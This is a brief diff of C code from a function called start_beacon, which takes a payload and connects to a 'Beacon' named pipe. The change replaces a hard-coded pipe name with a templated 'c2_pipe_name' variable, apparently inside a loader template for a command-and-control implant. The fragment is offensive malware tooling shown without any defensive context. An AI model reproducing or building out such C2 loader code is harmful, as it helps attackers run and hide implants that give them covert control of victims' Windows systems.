@@ -44,7 +44,7 @@ HANDLE start_beacon(char * payload, unsigned int pylen){
      * connect to our Beacon named pipe */
     HANDLE handle_beacon = INVALID_HANDLE_VALUE;
     while (handle_beacon == INVALID_HANDLE_VALUE) {
-        handle_beacon = CreateFileA("\\\\.\\pipe\\foobar",
+        handle_beacon = CreateFileA(```[var:::c2_pipe_name]```,
             GENERIC_READ | GENERIC_WRITE,
             0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
     
